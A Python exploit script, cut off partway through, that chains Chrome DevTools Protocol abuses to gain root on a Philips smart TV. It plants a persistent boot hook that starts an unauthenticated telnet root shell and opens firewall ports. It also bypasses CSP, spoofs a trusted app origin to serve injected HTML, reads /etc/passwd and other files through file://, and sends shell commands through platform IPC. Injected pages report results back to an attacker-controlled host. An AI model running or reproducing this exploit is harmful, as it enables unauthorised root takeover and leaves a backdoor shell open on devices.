#!/usr/bin/env python3
"""
CDP → Root exploit for Philips TPN236E (43PUS8118/12)
Version 2 — based on firmware 169.001 static analysis

Prerequisite: USB stick with 'nbrowser_log_to_file' inserted in TV,
and a browser-based app open (Titan OS store, Internet browser, etc.)

Attack chains (priority order):
  A. CDP Download  — Browser.setDownloadBehavior → download customer_env.sh to /mtd_rwarea/apdat/
  A2. CDP Download (enable_debug_port) — write /mnt/browser/nettv/enable_debug_port → reboot → CDP:7001
  B. PPAPI idtv    — <embed type="application/x-ppapi-idtvService"> → NPC command to idtv
  C. CSP Bypass    — Page.setBypassCSP → probe omi.ipc.PlatformMessage
  D. Fetch Intercept — Spoof app.titanos.tv origin → access jsplugins
  E. Navigate HTTP — Our exploit page → JointSpace loopback + probes
  F. file:// nav   — Read filesystem via file:// protocol
  G. Info gather   — msg_server/cmd_daemon IPC details for manual exploitation
  H. Two-stage     — If CDP:7001 opens → sendPlatformMessage → setSystemCmd → root

Usage: python3 cdp_root.py [TV_IP] [PC_IP]
"""

import sys
import json
import time
import base64
import socket
import struct
import os
import threading
import http.server

TV_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
PC_IP = sys.argv[2] if len(sys.argv) > 2 else "192.168.1.50"
CDP_PORT = 7788
CDP_URL = f"http://{TV_IP}:{CDP_PORT}"
PC_PORT = 8099

CUSTOMER_ENV = """#!/bin/sh
# Persistent root hook — written by cdp_root.py
grep -q "app.titanos.tv" /etc/hosts || echo "127.0.0.1 app.titanos.tv" >> /etc/hosts
iptables -w 5 -I INPUT -p tcp --dport 2323 -j ACCEPT 2>/dev/null
iptables -w 5 -I INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null
if [ -f /tmp/busybox ]; then
    /tmp/busybox telnetd -p 2323 -l /bin/sh 2>/dev/null
else
    busybox telnetd -p 2323 -l /bin/sh 2>/dev/null
fi
echo "root_hook_ok $(date)" > /tmp/root_hook_status
"""


# ==================== WebSocket helpers ====================

def http_get(path):
    import urllib.request
    try:
        url = f"{CDP_URL}{path}"
        req = urllib.request.Request(url, headers={"Host": f"{TV_IP}:{CDP_PORT}"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        return {"error": str(e)}


def ws_connect(ws_url):
    import re
    m = re.match(r"ws://([^:/]+):(\d+)(/.+)", ws_url)
    if not m:
        raise ValueError(f"Invalid WS URL: {ws_url}")
    host, port, path = m.group(1), int(m.group(2)), m.group(3)
    sock = socket.create_connection((host, port), timeout=10)
    key = base64.b64encode(os.urandom(16)).decode()
    handshake = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    )
    sock.sendall(handshake.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("WS handshake failed")
        resp += chunk
    if b"101" not in resp.split(b"\r\n")[0]:
        raise ConnectionError(f"WS upgrade failed: {resp[:200]}")
    return sock


def ws_send(sock, data):
    payload = data.encode("utf-8")
    frame = bytearray()
    frame.append(0x81)
    mask_key = os.urandom(4)
    length = len(payload)
    if length < 126:
        frame.append(0x80 | length)
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack(">H", length))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack(">Q", length))
    frame.extend(mask_key)
    masked = bytearray(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    frame.extend(masked)
    sock.sendall(frame)


def ws_recv(sock, timeout=10):
    sock.settimeout(timeout)
    try:
        header = sock.recv(2)
        if len(header) < 2:
            return None
        opcode = header[0] & 0x0f
        masked = (header[1] & 0x80) != 0
        length = header[1] & 0x7f
        if length == 126:
            length = struct.unpack(">H", sock.recv(2))[0]
        elif length == 127:
            length = struct.unpack(">Q", sock.recv(8))[0]
        if masked:
            mask_key = sock.recv(4)
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                break
            data += chunk
        if masked:
            data = bytearray(b ^ mask_key[i % 4] for i, b in enumerate(data))
        if opcode == 0x01:
            return data.decode("utf-8", errors="replace")
        elif opcode == 0x08:
            return None
        elif opcode == 0x09:
            pong = bytearray([0x8a, 0x80]) + os.urandom(4)
            sock.sendall(pong)
            return ws_recv(sock, timeout)
        return data.decode("utf-8", errors="replace") if data else None
    except socket.timeout:
        return None


def cdp_call(sock, method, params=None, msg_id=None):
    if msg_id is None:
        cdp_call._id = getattr(cdp_call, "_id", 0) + 1
        msg_id = cdp_call._id
    msg = {"id": msg_id, "method": method}
    if params:
        msg["params"] = params
    ws_send(sock, json.dumps(msg))
    deadline = time.time() + 15
    while time.time() < deadline:
        raw = ws_recv(sock, timeout=5)
        if raw is None:
            continue
        try:
            resp = json.loads(raw)
            if resp.get("id") == msg_id:
                return resp
        except json.JSONDecodeError:
            pass
    return {"error": "timeout"}


def cdp_evaluate(sock, expression, await_promise=False):
    params = {
        "expression": expression,
        "returnByValue": True,
        "generatePreview": True,
        "awaitPromise": await_promise,
    }
    return cdp_call(sock, "Runtime.evaluate", params)


def get_eval_value(resp):
    return resp.get("result", {}).get("result", {}).get("value", "")


# ==================== PHASE 1: CDP Connection ====================

def phase1_connect():
    print("=" * 60)
    print("PHASE 1: CDP Connection Test")
    print("=" * 60)

    print(f"\n[1.1] Testing CDP at {CDP_URL}/json/version ...")
    version = http_get("/json/version")
    if "error" in version:
        print(f"  FAIL: {version['error']}")
        print("  -> USB con nbrowser_log_to_file insertado?")
        print("  -> App del browser abierta en la tele?")
        return None
    print(f"  OK: {json.dumps(version, indent=2)}")

    print(f"\n[1.2] Listing targets at {CDP_URL}/json ...")
    targets = http_get("/json")
    if "error" in targets or not isinstance(targets, list):
        print(f"  FAIL: {targets}")
        return None

    print(f"  Found {len(targets)} target(s):")
    for i, t in enumerate(targets):
        ttype = t.get("type", "?")
        title = t.get("title", "?")
        url = t.get("url", "?")[:80]
        ws = "YES" if t.get("webSocketDebuggerUrl") else "no"
        print(f"  [{i}] {ttype}: '{title}' url={url} ws={ws}")
    return targets


# ==================== PHASE 2: Probe APIs ====================

def phase2_probe(sock, target_info):
    print("\n" + "=" * 60)
    print("PHASE 2: API Probe from CDP target")
    print("=" * 60)

    target_url = target_info.get("url", "unknown")
    print(f"\n  Target URL: {target_url}")

    # 2.1: omi_platform / sendPlatformMessage
    print("\n[2.1] Checking omi_platform (sendPlatformMessage)...")
    r = cdp_evaluate(sock, """
        (function() {
            var info = {};
            info.omi_platform = typeof window.omi_platform;
            if (window.omi_platform) {
                info.sendPlatformMessage = typeof window.omi_platform.sendPlatformMessage;
                info.addPlatformEventListener = typeof window.omi_platform.addPlatformEventListener;
            }
            info.location = window.location.href;
            info.origin = window.location.origin;
            return JSON.stringify(info);
        })()
    """)
    val = get_eval_value(r)
    print(f"  Result: {val}")
    if '"sendPlatformMessage":"function"' in str(val):
        print("  *** sendPlatformMessage AVAILABLE! ***")
        return "SEND_PLATFORM_MESSAGE"

    # 2.2: jsplugins / native objects
    print("\n[2.2] Checking jsplugins and native objects...")
    r = cdp_evaluate(sock, """
        (function() {
            var found = [];
            var names = ['oipfObjectFactory', 'oipfApplicationManager',
                         'oipfConfiguration', 'tpvision', 'tvapi',
                         'BrowserIpcPluginClass', 'nettv', 'hbbtv',
                         'SambaTV', 'AirServer'];
            for (var i = 0; i < names.length; i++) {
                try {
                    if (typeof window[names[i]] !== 'undefined')
                        found.push(names[i] + '=' + typeof window[names[i]]);
                } catch(e) {}
            }
            var extras = [];
            for (var k in window) {
                try {
                    var t = typeof window[k];
                    if (t === 'object' && window[k] !== null) {
                        if (/omi|platform|plugin|nettv|opera|tpv|philips|system|idtv|npc/.test(k))
                            extras.push(k);
                    }
                } catch(e) {}
            }
            return JSON.stringify({native_objects: found, extras: extras});
        })()
    """)
    print(f"  Result: {get_eval_value(r)}")

    # 2.3: file:// XHR read
    print("\n[2.3] Testing file:// read access...")
    r = cdp_evaluate(sock, """
        (function() {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'file:///etc/hostname', false);
                xhr.send();
                return 'FILE_READ_OK:' + xhr.status + ':' + xhr.responseText.substring(0, 200);
            } catch(e) {
                return 'FILE_READ_FAIL:' + e.message;
            }
        })()
    """)
    val = get_eval_value(r)
    print(f"  Result: {val}")
    if "FILE_READ_OK" in str(val):
        print("  * file:// reads work!")

    # 2.4: JointSpace loopback XHR
    print("\n[2.4] Testing JointSpace loopback (127.0.0.1:1925)...")
    r = cdp_evaluate(sock, """
        new Promise(function(resolve) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://127.0.0.1:1925/6/system', true);
            xhr.timeout = 5000;
            xhr.onload = function() {
                resolve('JOINTSPACE_OK:' + xhr.status + ':' + xhr.responseText.substring(0, 300));
            };
            xhr.onerror = function() { resolve('JOINTSPACE_CORS_BLOCKED'); };
            xhr.ontimeout = function() { resolve('JOINTSPACE_TIMEOUT'); };
            xhr.send();
        })
    """, await_promise=True)
    print(f"  Result: {get_eval_value(r)[:200]}")

    # 2.5: PC connectivity
    print(f"\n[2.5] Testing fetch to PC ({PC_IP}:{PC_PORT})...")
    r = cdp_evaluate(sock, f"""
        new Promise(function(resolve) {{
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://{PC_IP}:{PC_PORT}/ping', true);
            xhr.timeout = 5000;
            xhr.onload = function() {{ resolve('PC_OK:' + xhr.responseText.substring(0, 100)); }};
            xhr.onerror = function() {{ resolve('PC_BLOCKED'); }};
            xhr.ontimeout = function() {{ resolve('PC_TIMEOUT'); }};
            xhr.send();
        }})
    """, await_promise=True)
    print(f"  Result: {get_eval_value(r)}")

    # 2.6: Browser info
    print("\n[2.6] Environment info...")
    r = cdp_evaluate(sock, """
        (function() {
            var info = {};
            info.userAgent = navigator.userAgent;
            info.platform = navigator.platform;
            try { info.process = typeof process; } catch(e) {}
            try { info.require = typeof require; } catch(e) {}
            try { info.global = typeof global; } catch(e) {}
            return JSON.stringify(info);
        })()
    """)
    print(f"  Result: {get_eval_value(r)}")

    return "PROBE_DONE"


# ==================== ATTACK A: CDP Download ====================

def attack_cdp_download(sock):
    """Write customer_env.sh via Browser.setDownloadBehavior + triggered download."""
    print("\n--- ATTACK A: CDP Download (Browser.setDownloadBehavior) ---")

    # A.1: Try multiple download targets — customer_env.sh and enable_debug_port
    # Priority targets for customer_env.sh
    targets = ["/mtd_rwarea/apdat", "/mtd_apdat", "/tmp"]
    for target_dir in targets:
        print(f"\n  [A.1] Setting download path to {target_dir}/ ...")

        # Try Browser.setDownloadBehavior first (newer API)
        r = cdp_call(sock, "Browser.setDownloadBehavior", {
            "behavior": "allow",
            "downloadPath": target_dir,
        })
        if r.get("error"):
            print(f"    Browser.setDownloadBehavior: {r}")
            # Fall back to Page.setDownloadBehavior (deprecated but older Chromium)
            r = cdp_call(sock, "Page.setDownloadBehavior", {
                "behavior": "allow",
                "downloadPath": target_dir,
            })
            if r.get("error"):
                print(f"    Page.setDownloadBehavior also failed: {r}")
                continue

        print(f"    setDownloadBehavior OK for {target_dir}")

        # A.2: Navigate to our server which serves customer_env.sh as download
        print(f"  [A.2] Triggering download from http://{PC_IP}:{PC_PORT}/download/customer_env.sh ...")
        r = cdp_call(sock, "Page.navigate", {
            "url": f"http://{PC_IP}:{PC_PORT}/download/customer_env.sh"
        })
        print(f"    Navigate result: {r.get('result', r.get('error', 'unknown'))}")

        # A.3: Wait for download events
        print("  [A.3] Waiting for download events...")
        deadline = time.time() + 10
        download_started = False
        while time.time() < deadline:
            raw = ws_recv(sock, timeout=2)
            if raw is None:
                continue
            try:
                msg = json.loads(raw)
                method = msg.get("method", "")
                if "download" in method.lower():
                    print(f"    EVENT: {method} → {json.dumps(msg.get('params', {}))[:200]}")
                    download_started = True
                    if "Complete" in str(msg.get("params", {})):
                        print(f"    *** DOWNLOAD COMPLETE to {target_dir}/ ***")
                        break
            except json.JSONDecodeError:
                pass

        if download_started:
            print(f"\n  Download triggered! Verifying via file:// read...")
            time.sleep(2)
            r = cdp_evaluate(sock, f"""
                (function() {{
                    try {{
                        var xhr = new XMLHttpRequest();
                        xhr.open('GET', 'file://{target_dir}/customer_env.sh', false);
                        xhr.send();
                        return 'VERIFY_OK:' + xhr.responseText.substring(0, 100);
                    }} catch(e) {{
                        return 'VERIFY_FAIL:' + e.message;
                    }}
                }})()
            """)
            val = get_eval_value(r)
            if "VERIFY_OK" in str(val) and "root_hook_ok" in str(val):
                print(f"    *** customer_env.sh WRITTEN to {target_dir}! ***")
                return True
            print(f"    Verify: {val}")

        # A.4: Alternative — use JS to create blob and trigger download
        print("  [A.4] Trying JS-triggered download (Blob + anchor click)...")
        payload_b64 = base64.b64encode(CUSTOMER_ENV.encode()).decode()
        r = cdp_evaluate(sock, f"""
            (function() {{
                try {{
                    var b = atob('{payload_b64}');
                    var blob = new Blob([b], {{type: 'application/octet-stream'}});
                    var url = URL.createObjectURL(blob);
                    var a = document.createElement('a');
                    a.href = url;
                    a.download = 'customer_env.sh';
                    document.body.appendChild(a);
                    a.click();
                    URL.revokeObjectURL(url);
                    return 'BLOB_DOWNLOAD_TRIGGERED';
                }} catch(e) {{
                    return 'BLOB_FAIL:' + e.message;
                }}
            }})()
        """)
        print(f"    Result: {get_eval_value(r)}")
        time.sleep(3)

    # A.5: Alternative — use Page.setDocumentContent to inject download
    print("\n  [A.5] Trying Page.setDocumentContent with auto-download...")
    payload_b64 = base64.b64encode(CUSTOMER_ENV.encode()).decode()
    r = cdp_call(sock, "Page.getFrameTree")
    frame_id = None
    if "result" in r:
        frame_id = r["result"].get("frameTree", {}).get("frame", {}).get("id")
    if frame_id:
        dl_html = f"""<html><body><script>
var b = atob('{payload_b64}');
var blob = new Blob([b], {{type:'application/octet-stream'}});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url; a.download = 'customer_env.sh';
document.body.appendChild(a); a.click();
document.title = 'DL_TRIGGERED';
</script></body></html>"""
        cdp_call(sock, "Page.setDocumentContent", {
            "frameId": frame_id,
            "html": dl_html,
        })
        time.sleep(3)
        r = cdp_evaluate(sock, "document.title")
        print(f"    setDocumentContent result: {get_eval_value(r)}")

    # A.6: Enable browser.out CDP by writing enable_debug_port
    # This is the TWO-STAGE attack: nbrowser CDP → enable browser.out CDP → reboot → root
    debug_targets = [
        "/mnt/browser/nettv",
        "/mtd_rwarea/browser/nettv",
        "/tmp",
    ]
    for target_dir in debug_targets:
        print(f"\n  [A.6] Writing enable_debug_port to {target_dir}/ ...")
        r = cdp_call(sock, "Browser.setDownloadBehavior", {
            "behavior": "allow",
            "downloadPath": target_dir,
        })
        if r.get("error"):
            r = cdp_call(sock, "Page.setDownloadBehavior", {
                "behavior": "allow",
                "downloadPath": target_dir,
            })
            if r.get("error"):
                print(f"    setDownloadBehavior failed for {target_dir}")
                continue

        # Download empty enable_debug_port file
        cdp_call(sock, "Page.navigate", {
            "url": f"http://{PC_IP}:{PC_PORT}/download/enable_debug_port"
        })
        time.sleep(3)
        print(f"    enable_debug_port download triggered to {target_dir}")

        # Also write add_browser_command_line.txt (arbitrary flag injection)
        r = cdp_call(sock, "Browser.setDownloadBehavior", {
            "behavior": "allow",
            "downloadPath": target_dir,
        })
        cdp_call(sock, "Page.navigate", {
            "url": f"http://{PC_IP}:{PC_PORT}/download/add_browser_command_line.txt"
        })
        time.sleep(2)
        print(f"    add_browser_command_line.txt download triggered to {target_dir}")

    return False


# ==================== ATTACK B: PPAPI idtvService ====================

def attack_ppapi_idtv(sock):
    """Try PPAPI plugin to send NPC commands to idtv service."""
    print("\n--- ATTACK B: PPAPI idtvService (NPC commands) ---")

    # B.1: Check if PPAPI plugin is loadable
    print("  [B.1] Attempting to instantiate PPAPI idtvService plugin...")
    r = cdp_evaluate(sock, """
        (function() {
            try {
                var el = document.createElement('embed');
                el.type = 'application/x-ppapi-idtvService';
                el.width = 1; el.height = 1;
                el.style.position = 'absolute';
                el.style.left = '-9999px';
                document.body.appendChild(el);
                // Check if plugin loaded
                var info = {
                    type: el.type,
                    postMessage: typeof el.postMessage,
                    readyState: el.readyState
                };
                return 'PPAPI_PROBE:' + JSON.stringify(info);
            } catch(e) {
                return 'PPAPI_FAIL:' + e.message;
            }
        })()
    """)
    val = get_eval_value(r)
    print(f"  Result: {val}")

    if '"postMessage":"function"' in str(val):
        print("  *** PPAPI plugin has postMessage! Sending NPC commands... ***")

        # B.2: Try different command formats
        commands = [
            # Format from firmware: setCmd sends to NPC_CMD_CLIENT
            '{"command":"setSystemCmd","data":"echo CDP_PPAPI_ROOT > /tmp/cdp_root_proof"}',
            # Try bare command
            'echo CDP_PPAPI_ROOT > /tmp/cdp_root_proof',
            # Try NPC format
            '{"cmd":"COM.NVT.NPC.CMD","data":"echo CDP_PPAPI_ROOT > /tmp/cdp_root_proof"}',
            # Try setCmd format
            'setCmd:echo CDP_PPAPI_ROOT > /tmp/cdp_root_proof',
        ]

        for i, cmd in enumerate(commands):
            print(f"\n  [B.2.{i}] Sending: {cmd[:60]}...")
            r = cdp_evaluate(sock, f"""
                (function() {{
                    try {{
                        var el = document.querySelector('embed[type="application/x-ppapi-idtvService"]');
                        if (!el) return 'NO_EMBED';
                        el.postMessage({json.dumps(cmd)});
                        return 'SENT_OK';
                    }} catch(e) {{
                        return 'SEND_FAIL:' + e.message;
                    }}
                }})()
            """)
            print(f"    Result: {get_eval_value(r)}")
            time.sleep(1)

        # B.3: If commands worked, write customer_env.sh
        print("\n  [B.3] Attempting to write customer_env.sh via NPC...")
        escaped = CUSTOMER_ENV.replace("'", "'\\''").replace("\n", "\\n")
        write_cmd = f"printf '{escaped}' > /mtd_rwarea/apdat/customer_env.sh && chmod +x /mtd_rwarea/apdat/customer_env.sh"
        r = cdp_evaluate(sock, f"""
            (function() {{
                try {{
                    var el = document.querySelector('embed[type="application/x-ppapi-idtvService"]');
                    if (!el) return 'NO_EMBED';
                    el.postMessage('{write_cmd}');
                    return 'WRITE_CMD_SENT';
                }} catch(e) {{
                    return 'WRITE_FAIL:' + e.message;
                }}
            }})()
        """)
        print(f"    Result: {get_eval_value(r)}")
        return True

    print("  PPAPI plugin not available or no postMessage.")
    return False


# ==================== ATTACK C: CSP Bypass + Platform Messages ====================

def attack_csp_bypass(sock):
    """Bypass CSP and try to access platform messaging."""
    print("\n--- ATTACK C: CSP Bypass + Platform Messages ---")

    # C.1: Bypass CSP
    print("  [C.1] Setting Page.setBypassCSP(true)...")
    r = cdp_call(sock, "Page.setBypassCSP", {"enabled": True})
    if r.get("error"):
        print(f"    setBypassCSP failed: {r}")
    else:
        print("    CSP bypass enabled!")

    # C.2: Navigate to about:blank then try platform messaging
    print("  [C.2] Navigating to about:blank for clean context...")
    cdp_call(sock, "Page.navigate", {"url": "about:blank"})
    time.sleep(1)

    # C.3: Probe for OMI platform messaging
    print("  [C.3] Probing OMI IPC from clean context...")
    r = cdp_evaluate(sock, """
        (function() {
            var found = [];
            // Check all window properties
            for (var k in window) {
                try {
                    if (/omi|platform|ipc|npc|idtv|system/i.test(k) && typeof window[k] !== 'undefined')
                        found.push(k + ':' + typeof window[k]);
                } catch(e) {}
            }
            // Check for OIPF/HbbTV objects
            var mimes = [];
            try {
                for (var i = 0; i < navigator.mimeTypes.length; i++)
                    mimes.push(navigator.mimeTypes[i].type);
            } catch(e) {}
            // Check plugins
            var plugins = [];
            try {
                for (var i = 0; i < navigator.plugins.length; i++)
                    plugins.push(navigator.plugins[i].name);
            } catch(e) {}
            return JSON.stringify({props: found, mimes: mimes, plugins: plugins});
        })()
    """)
    val = get_eval_value(r)
    print(f"  Result: {val}")

    # C.4: Try loading a URL that might have platform access
    privileged_urls = [
        "opera:blank",
        "chrome://version",
        "chrome://about",
        f"http://localhost:1925/6/system",
    ]
    for url in privileged_urls:
        print(f"\n  [C.4] Trying navigation to {url}...")
        cdp_call(sock, "Page.navigate", {"url": url})
        time.sleep(2)
        r = cdp_evaluate(sock, """
            (function() {
                return JSON.stringify({
                    url: location.href,
                    omi: typeof window.omi_platform,
                    sendPM: typeof (window.omi_platform && window.omi_platform.sendPlatformMessage)
                });
            })()
        """)
        val = get_eval_value(r)
        print(f"    Result: {val}")
        if "sendPlatformMessage" in str(val) and '"function"' in str(val):
            print("    *** sendPlatformMessage FOUND! ***")
            return "SEND_PLATFORM_MESSAGE"

    return False


# ==================== ATTACK D: Fetch Intercept ====================

def attack_fetch_intercept(sock):
    """Intercept app.titanos.tv to get authorized origin."""
    print("\n--- ATTACK D: CDP Fetch intercept (spoof titanos.tv origin) ---")

    exploit_html = """<!DOCTYPE html>
<html><body><script>
(function() {
    var R = [];
    function log(m) { R.push(m); }
    log('Origin: ' + location.origin);
    log('URL: ' + location.href);
    log('omi_platform: ' + typeof window.omi_platform);
    if (window.omi_platform && window.omi_platform.sendPlatformMessage) {
        log('sendPlatformMessage FOUND!');
        try {
            var r = window.omi_platform.sendPlatformMessage(JSON.stringify({
                cmd: 'setSystemCmd',
                data: 'echo CDP_FETCH_ROOT > /tmp/cdp_root_proof && iptables -w 5 -I INPUT -p tcp --dport 2323 -j ACCEPT && busybox telnetd -p 2323 -l /bin/sh'
            }));
            log('setSystemCmd: ' + String(r));
        } catch(e) { log('setSystemCmd error: ' + e.message); }
    }
    // Try OIPF plugins from titanos origin
    var types = ['application/browser-ipc-2', 'application/x-ppapi-idtvService'];
    for (var i = 0; i < types.length; i++) {
        try {
            var o = document.createElement('object');
            o.type = types[i];
            document.body.appendChild(o);
            var extra = [];
            for (var k in o) {
                if (typeof o[k] === 'function' && !(k in HTMLObjectElement.prototype)) extra.push(k);
            }
            log(types[i] + ': ' + extra.length + ' methods' + (extra.length>0 ? ': '+extra.join(',') : ''));
        } catch(e) { log(types[i] + ': ' + e.message); }
    }
    setTimeout(function() {
        var x = new XMLHttpRequest();
        x.open('POST', 'http://""" + PC_IP + ":" + str(PC_PORT) + """/results', true);
        x.send(R.join('\\n'));
    }, 3000);
})();
</script></body></html>"""

    exploit_b64 = base64.b64encode(exploit_html.encode()).decode()

    print("  [D.1] Enabling Fetch intercept for titanos.tv...")
    r = cdp_call(sock, "Fetch.enable", {
        "patterns": [{"urlPattern": "*app.titanos.tv*", "requestStage": "Request"}]
    })
    if r.get("error") and "error" in str(r.get("error", "")):
        print(f"    Fetch.enable failed: {r}")
        return False
    print(f"    Fetch enabled")

    print("  [D.2] Navigating to https://app.titanos.tv/exploit ...")
    cdp_call(sock, "Page.navigate", {"url": "https://app.titanos.tv/exploit"})

    print("  [D.3] Waiting for intercepted request...")
    deadline = time.time() + 10
    intercepted = False
    while time.time() < deadline:
        raw = ws_recv(sock, timeout=2)
        if raw is None:
            continue
        try:
            msg = json.loads(raw)
            if msg.get("method") == "Fetch.requestPaused":
                request_id = msg["params"]["requestId"]
                cdp_call(sock, "Fetch.fulfillRequest", {
                    "requestId": request_id,
                    "responseCode": 200,
                    "responseHeaders": [
                        {"name": "Content-Type", "value": "text/html; charset=utf-8"},
                    ],
                    "body": exploit_b64,
                })
                intercepted = True
                print("    Served exploit as app.titanos.tv!")
                break
        except (json.JSONDecodeError, KeyError):
            pass

    if not intercepted:
        cdp_call(sock, "Fetch.disable")
        print("    No request intercepted")
        return False

    time.sleep(5)
    cdp_call(sock, "Fetch.disable")
    return True


# ==================== ATTACK E: Navigate to our exploit ====================

def attack_navigate_exploit(sock):
    """Navigate to our HTTP server for comprehensive probing."""
    print(f"\n--- ATTACK E: Navigate to http://{PC_IP}:{PC_PORT}/exploit.html ---")

    r = cdp_call(sock, "Page.navigate", {"url": f"http://{PC_IP}:{PC_PORT}/exploit.html"})
    print(f"  Navigate: {r.get('result', r.get('error', 'unknown'))}")
    time.sleep(3)
    r = cdp_evaluate(sock, "document.title + '|' + location.href")
    print(f"  Loaded: {get_eval_value(r)}")
    return True


# ==================== ATTACK F: file:// navigation ====================

def attack_file_navigate(sock):
    """Navigate to file:// URIs for filesystem read."""
    print("\n--- ATTACK F: file:// navigation ---")

    # Read key files
    files_to_read = [
        "/etc/passwd",
        "/proc/version",
        "/mtd_rwarea/apdat/customer_env.sh",
        "/tmp/cmd",
        "/proc/sysvipc/msg",
    ]
    for filepath in files_to_read:
        r = cdp_evaluate(sock, f"""
            (function() {{
                try {{
                    var xhr = new XMLHttpRequest();
                    xhr.open('GET', 'file://{filepath}', false);
                    xhr.send();
                    return 'OK:' + xhr.responseText.substring(0, 200);
                }} catch(e) {{
                    return 'FAIL:' + e.message;
                }}
            }})()
        """)
        val = get_eval_value(r)
        status = "OK" if val.startswith("OK:") else "FAIL"
        print(f"  {filepath}: {status}")
        if val.startswith("OK:"):
            print(f"    Content: {val[3:100]}")

    # Navigate to file:///etc/passwd to test page navigation
    print("\n  [F.2] Testing file:// page navigation...")
    cdp_call(sock, "Page.navigate", {"url": "file:///etc/passwd"})
    time.sleep(2)
    r = cdp_evaluate(sock, "document.body ? document.body.innerText.substring(0, 200) : 'NO_BODY'")
    val = get_eval_value(r)
    if "root:" in str(val):
        print(f"    file:// page navigation works! Content: {val[:100]}")
    else:
        print(f"    file:// nav result: {val[:100]}")

    return True


# ==================== ATTACK G: sendPlatformMessage (if available) ====================

def attack_sendPlatformMessage(sock):
    """Direct root via sendPlatformMessage (only if available)."""
    print("\n--- ATTACK G: sendPlatformMessage -> setSystemCmd ---")

    cmds = [
        f"printf '{CUSTOMER_ENV}' > /mtd_rwarea/apdat/customer_env.sh",
        "chmod +x /mtd_rwarea/apdat/customer_env.sh",
        "iptables -w 5 -I INPUT -p tcp --dport 2323 -j ACCEPT",
        "busybox telnetd -p 2323 -l /bin/sh",
        "echo 'CDP_ROOT_$(date)' > /tmp/cdp_root_proof",
    ]

    for i, cmd in enumerate(cmds):
        print(f"\n  [{i+1}/{len(cmds)}] {cmd[:60]}...")
        js = f"""
            (function() {{
                try {{
                    var msg = JSON.stringify({{cmd: "setSystemCmd", data: {json.dumps(cmd)}}});
                    var r = window.omi_platform.sendPlatformMessage(msg);
                    return 'SENT:' + String(r);
                }} catch(e) {{
                    return 'ERROR:' + e.message;
                }}
            }})()
        """
        r = cdp_evaluate(sock, js)
        print(f"    Result: {get_eval_value(r)}")
        time.sleep(0.5)

    print("\n  Testing telnet...")
    time.sleep(2)
    try:
        s = socket.create_connection((TV_IP, 2323), timeout=5)
        s.sendall(b"id\n")
        time.sleep(1)
        resp = s.recv(4096).decode(errors="replace")
        print(f"  *** TELNET OK: {resp[:200]} ***")
        s.close()
        return True
    except Exception as e:
        print(f"  Telnet not available: {e}")
        print("  customer_env.sh written, cold reboot to activate")
        return True


# ==================== ATTACK H: Two-stage (try CDP:7001) ====================

def attack_two_stage_cdp7001():
    """Try browser.out CDP on port 7001 — this is the LAUNCHER context with sendPlatformMessage."""
    print("\n--- ATTACK H: Two-stage — browser.out CDP:7001 (Launcher/opw=0) ---")
    print("  browser.out CDP gives access to launcher context (opw=0)")
    print("  which has sendPlatformMessage → setSystemCmd → root!")

    print(f"\n  [H.1] Testing CDP at http://{TV_IP}:7001/json/version ...")
    version = http_get_port("/json/version", 7001)
    if "error" in version:
        print(f"    CDP:7001 not available: {version['error']}")
        print("    → Need enable_debug_port in /mnt/browser/nettv/ or /tmp/")
        print("    → If download chain worked, cold reboot and retry")
        return False

    print(f"    *** CDP:7001 IS OPEN! ***")
    print(f"    {json.dumps(version, indent=2)}")

    targets7001 = http_get_port("/json", 7001)
    if "error" in targets7001 or not isinstance(targets7001, list):
        print(f"    Cannot list targets: {targets7001}")
        return False

    print(f"    Found {len(targets7001)} target(s):")
    for i, t in enumerate(targets7001):
        print(f"    [{i}] {t.get('type','?')}: '{t.get('title','?')[:40]}' url={t.get('url','?')[:60]}")

    ws_targets = [t for t in targets7001 if t.get("webSocketDebuggerUrl")]
    if not ws_targets:
        print("    No debuggable targets on :7001")
        return False

    target = ws_targets[0]
    ws_url = target["webSocketDebuggerUrl"]
    print(f"\n    Connecting to: {ws_url}")

    try:
        sock7001 = ws_connect(ws_url)
    except Exception as e:
        print(f"    WebSocket failed: {e}")
        return False
    print("    Connected to browser.out!")

    # Probe for sendPlatformMessage
    r = cdp_evaluate(sock7001, """
        (function() {
            return JSON.stringify({
                omi_platform: typeof window.omi_platform,
                sendPM: window.omi_platform ? typeof window.omi_platform.sendPlatformMessage : 'N/A',
                url: location.href,
                origin: location.origin
            });
        })()
    """)
    val = get_eval_value(r)
    print(f"    Platform probe: {val}")

    if '"sendPM":"function"' in str(val):
        print("    *** sendPlatformMessage AVAILABLE on launcher! ***")
        attack_sendPlatformMessage(sock7001)
        sock7001.close()
        return True

    # Try factory plugin (file write capability)
    print("\n  [H.2] Trying NetTV_objectFactory plugin (file write)...")
    r = cdp_evaluate(sock7001, """
        (function() {
            try {
                var o = document.createElement('object');
                o.type = 'application/nettv_objectfactory';
                document.body.appendChild(o);
                var methods = [];
                for (var k in o) {
                    try { if (typeof o[k] === 'function') methods.push(k); } catch(e) {}
                }
                return 'FACTORY:' + methods.length + ':' + methods.join(',');
            } catch(e) { return 'FACTORY_FAIL:' + e.message; }
        })()
    """)
    print(f"    Result: {get_eval_value(r)}")

    # Try browser-ipc-2 plugin
    print("\n  [H.3] Trying browser-ipc-2 plugin (mq_send, system)...")
    r = cdp_evaluate(sock7001, """
        (function() {
            try {
                var o = document.createElement('object');
                o.type = 'application/browser-ipc-2';
                document.body.appendChild(o);
                var methods = [];
                for (var k in o) {
                    try { if (typeof o[k] === 'function') methods.push(k); } catch(e) {}
                }
                return 'BIPC2:' + methods.length + ':' + methods.join(',');
